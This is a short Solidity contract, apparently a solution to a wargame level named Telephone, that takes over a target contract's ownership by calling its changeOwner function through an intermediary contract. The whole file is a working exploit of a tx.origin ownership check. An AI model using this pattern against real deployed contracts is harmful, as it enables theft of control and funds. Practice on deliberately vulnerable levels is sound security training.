// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ITelephone.sol";

contract HackContract {
    ITelephone telephoneContract;

    constructor(address contractToBeHacked) {
        telephoneContract = ITelephone(contractToBeHacked);
    }

    function getOwnership(address newOwner) public {
        telephoneContract.changeOwner(newOwner);
    }
}
